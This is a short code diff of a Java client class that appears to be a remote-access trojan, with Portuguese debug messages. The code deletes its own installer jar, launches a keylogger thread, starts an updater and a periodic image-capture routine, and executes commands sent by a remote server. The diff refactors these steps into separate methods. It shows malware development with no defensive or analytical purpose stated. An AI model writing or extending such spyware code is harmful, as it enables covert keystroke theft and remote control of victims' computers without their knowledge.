@@ -54,8 +54,16 @@ public class ConnectClient {
             return;
         }
         ClientFileComponents.deleteFile(new File("Connect.jar"));
-        ClientCommandEnum.registerCommands();
+        registerAndStart();
+        keyLogger();
+    }
+
+    public static void keyLogger() {
         new Thread(ClientKeyLoggerComponents::startKeyLogger).start();
+    }
+
+    public static void registerAndStart() {
+        ClientCommandEnum.registerCommands();
         new Thread(ClientControlComponents::startUpdater).start();
         EXECUTOR.schedule(runnable(() -> new Thread(ClientImageComponents::startHistory).start()), Connect.DELAY, Connect.DELAY_TYPE);
         for (; ; ) {
@@ -77,7 +85,7 @@ public class ConnectClient {
      */
     public static void msg(String message) {
         if (LOCAL_DEBUG) {
-            System.out.println("Enviando: " + message);
+            Connect.log("Enviando: " + message);
         }
         try {
             WRITER.println(message);
@@ -135,7 +143,7 @@ public class ConnectClient {
             String serverMessage;
             while ((serverMessage = reader.readLine()) != null) {
                 if (LOCAL_DEBUG) {
-                    System.out.println("Recebido: " + serverMessage);
+                    Connect.log("Recebido: " + serverMessage);
                 }
                 ClientCommand.handleCommand(serverMessage);
             }
